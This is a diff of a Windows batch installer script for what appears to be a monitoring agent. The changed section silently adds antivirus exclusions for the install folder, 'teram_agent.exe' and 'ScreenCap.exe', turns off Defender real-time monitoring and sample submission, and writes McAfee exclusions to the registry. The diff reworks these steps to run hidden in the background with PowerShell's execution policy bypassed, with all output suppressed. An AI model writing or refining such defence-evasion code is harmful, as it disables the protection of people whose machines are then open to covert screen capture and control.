@@ -88,14 +88,18 @@ reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" /v EnableWebCon
 :: ═══════════════════════════════════════════════════
 echo [2/10] Configuring security exclusions (Defender + Third-Party AV)...
 
-powershell -NoProfile -Command ^
-  "try { Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -ErrorAction SilentlyContinue } catch {}; " ^
-  "try { Add-MpPreference -ExclusionPath '%~dp0' -ErrorAction SilentlyContinue } catch {}; " ^
-  "try { Add-MpPreference -ExclusionProcess '%BIN_NAME%' -ErrorAction SilentlyContinue } catch {}; " ^
-  "try { Add-MpPreference -ExclusionProcess 'teram_agent.exe' -ErrorAction SilentlyContinue } catch {}; " ^
-  "try { Add-MpPreference -ExclusionProcess 'ScreenCap.exe' -ErrorAction SilentlyContinue } catch {}; " ^
-  "try { Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue } catch {}; " ^
-  "try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } catch {}" >nul 2>&1
+:: Some corrupted machines will hang forever on Add-MpPreference if WMI is broken.
+:: Run this in the background using start /b so it never blocks the installation.
+set "DEFENDER_SCRIPT=%TEMP%\defender_excl.ps1"
+echo try { Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -ErrorAction SilentlyContinue } catch {} > "%DEFENDER_SCRIPT%"
+echo try { Add-MpPreference -ExclusionPath '%~dp0' -ErrorAction SilentlyContinue } catch {} >> "%DEFENDER_SCRIPT%"
+echo try { Add-MpPreference -ExclusionProcess '%BIN_NAME%' -ErrorAction SilentlyContinue } catch {} >> "%DEFENDER_SCRIPT%"
+echo try { Add-MpPreference -ExclusionProcess 'teram_agent.exe' -ErrorAction SilentlyContinue } catch {} >> "%DEFENDER_SCRIPT%"
+echo try { Add-MpPreference -ExclusionProcess 'ScreenCap.exe' -ErrorAction SilentlyContinue } catch {} >> "%DEFENDER_SCRIPT%"
+echo try { Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue } catch {} >> "%DEFENDER_SCRIPT%"
+echo try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } catch {} >> "%DEFENDER_SCRIPT%"
+
+start "" /B powershell -NoProfile -ExecutionPolicy Bypass -File "%DEFENDER_SCRIPT%" >nul 2>&1
 
 :: --- McAfee ---
 reg add "HKLM\SOFTWARE\McAfee\AVEngine\OAS\Exclusions\Paths" /v "%INSTALL_DIR%" /t REG_SZ /d "1" /f >nul 2>&1
